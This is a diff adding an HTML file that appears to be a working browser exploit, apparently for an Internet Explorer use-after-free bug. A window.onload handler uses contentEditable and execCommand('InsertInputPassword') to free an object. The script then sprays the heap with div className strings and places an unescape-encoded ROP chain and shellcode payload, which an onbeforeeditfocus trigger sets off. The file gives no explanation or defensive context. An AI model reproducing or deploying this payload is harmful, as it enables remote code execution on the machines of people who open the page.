@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+var freeReady = false;
+
+function getObject() {
+  var obj = '';
+  for (i=0; i < 11; i++) {
+    if (i==1) {
+      obj += unescape("%u7422%u77c3");
+    }
+    else if (i==2) {
+      obj += unescape("%u0105%u1ec2");
+    }
+    else if (i==3) {
+      obj += unescape("%u0101%u1ec2");
+    }
+    else {
+      obj += unescape("%u4a77%u535a");
+    }
+  }
+  obj += "\u4545";
+  return obj;
+}
+
+function emptyAllocator(obj) {
+  for (var i = 0; i < 40; i++)
+  {
+    var e = document.createElement('div');
+    e.className = obj;
+  }
+}
+
+function spray(obj) {
+  for (var i = 0; i < 50; i++)
+  {
+    var e = document.createElement('div');
+    e.className = obj;
+    document.appendChild(e);
+  }
+}
+
+function putPayload() {
+  var p = unescape("%u7556%u524d%u5667%u5776%u4166%u5458%u6c6f%u4946%u6162%u636c%u7968%u4954%u5551%u4141%u6b4f%u746c%u6471%u4263%u6c6b%u704d%u6566%u7a71%u7968%u4d6f%u5a4d%u4a7a%u6449%u584e%u5853%u566b%u7141%u764b%u4c49%u4357%u444d%u7a53%u6d4a%u7a6c%u696a%u7077%u4b42%u7567%u4463%u4b51%u7557%u6862%u5157%u557a%u7373%u414f%u4a6a%u456b%u7574%u6f73%u4345%u514a%u746b%u434a%u5544%u4e4e%u4162%u4e4a%u7150%u624b%u5063%u6446%u434f%u4653%u7676%u7767%u4948%u6c6f%u506b%u6253%u7847%u4375%u4e59%u676f%u7572%u5674%u5a6f%u6376%u656f%u786d%u434e%u6455%u7262%u7657%u626d%u7352%u7145%u765a%u4a6a%u4c45%u6855%u595a%u4b50%u6353%u6b50%u706e%u7641%u6754%u594d%u7449%u645a%u7373%u6a5a%u6f51%u5756%u7865%u586b%u4866%u017a%uc201%u011e%uc4d8%u0177%uc4d8%u0177%uc4d8%u0177%uc4d8%u0177%uc4d8%u0177%uc4d8%u0177%uc4d8%u0177%uc4d8%u0177%uc4d8%u0177%uc4d8%u1a77%uc4fa%u7277%u6152%u6052%uc3b8%u0677%uffff%u18ff%uc1be%u7477%u6d03%u2cbe%uc236%ubb77%uc5d9%u7177%uc2e0%u1377%uc50d%uc077%uffff%ubcff%uc58f%u1877%uc1be%u7677%u33b0%ubc26%uc58f%u1577%uc3ee%u1577%uc3ee%uef77%uc3ee%ubb77%uc5d9%u8c77%uc2a8%u9277%uc39f%u8477%uc3a1%ucc77%uc2aa%u6077%uc3b8%u2077%uc111%uf977%uc12d%u5977%uc354%u8177%u80c4%ufec7%ud9ff%ud9ed%u2474%u5df4%u7ab8%u022a%u2bf5%ub1c9%u8337%ufced%u4531%u0314%u6e45%uf7c8%u2f91%uf814%u2f59%u38a6%ua451%u3988%u8aa6%uc630%u16d8%ub028%ue627%ua3a9%u03ae%uf198%u40d5%uc589%u049e%uad22%ubcf3%uc3b1%ub3db%u6972%ufa3a%u5f83%u5082%uc147%uaa7e%u2194%u65be%u20e9%u9b87%u7002%ud050%u65b1%ua4d5%u8709%ua339%uff32%u733c%ub5c6%ua33f%uc177%u5b08%u8df3%u5aa8%ucdd0%u1595%u255d%ua46d%u77b7%u978e%ud4f7%u18b1%u25fa%u9ef5%u53e5%udd0d%u6398%u9cd6%ue146%u06cb%u510c%ub728%u04c1%ubbbb%u43ae%udfe3%u8731%udb9f%u26ba%u6a70%u0cf8%u3754%u2c5a%u9dcd%u510d%u790d%uf7f1%u6b45%u8ee6%ue107%u03f9%u4c32%u1bf9%ufe3d%u2a92%u91b6%ub2e5%ud61d%uf91a%u7e3c%ua4b3%uc3d4%u56de%u0703%ud4e7%uf7a6%uc41c%uf2c2%u4259%u8e3e%u27f2%u3d40%u6df2%ua023%ued60%u478a%u9401%u41d2");
+  var block = unescape("%u4a77%u535a");
+  while (block.length < 0x80000) block += block;
+  block = p + block.substring(0, (0x80000-p.length-6)/2);
+
+  for (var i = 0; i < 0x300; i++)
+  {
+    var e = document.createElement('div');
+    e.className = block;
+    document.appendChild(e);
+  }
+}
+
+function trigger() {
+  if (freeReady) {
+    var obj = getObject();
+    emptyAllocator(obj);
+    document.write("C");
+    spray(obj);
+    putPayload();
+  }
+}
+
+window.onload = function() {
+  document.body.contentEditable = 'true';
+  document.execCommand('InsertInputPassword');
+  document.body.innerHTML = 'X';
+  freeReady = true;
+}
+</script>
+</head>
+<body onbeforeeditfocus="trigger()">
+</body>
+</html>
